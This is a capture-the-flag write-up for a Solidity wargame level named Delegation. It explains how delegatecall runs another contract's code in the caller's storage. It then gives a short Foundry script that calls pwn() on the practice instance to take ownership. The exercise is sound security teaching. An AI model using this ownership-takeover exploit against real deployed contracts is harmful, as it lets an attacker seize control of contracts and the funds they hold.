# Delegation   
Our goal in this challenge is to claim ownership of the contract.
The purpose of this level is to understand how the `delegatecall` function works in Solidity.

To learn more about `delegatecall`, check out this resource: https://www.cyfrin.io/glossary/delegatecall-solidity-code-example.

The `delegatecall` function essentially "redirects" the execution flow to another contract, but it executes the code in the context of the calling contract. This means that any state changes (like changing the `owner`) will affect the calling contract, not the target contract.

In this case, we need to interact with the `Delegation` contract, which implements the `delegatecall` function. Our objective is to call the `pwn()` function from the `Delegate` contract, which will change the `owner` to the caller (us).

To automate this process, I created the following script: 
```solidity 
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
	address victim = /* place here the address of your instance */ ; 	
	
function run() public {
	vm.startBroadcast();
	(bool success, ) = victim.call(abi.encodeWithSignature("pwn()"));
	vm.stopBroadcast();
}
}
```
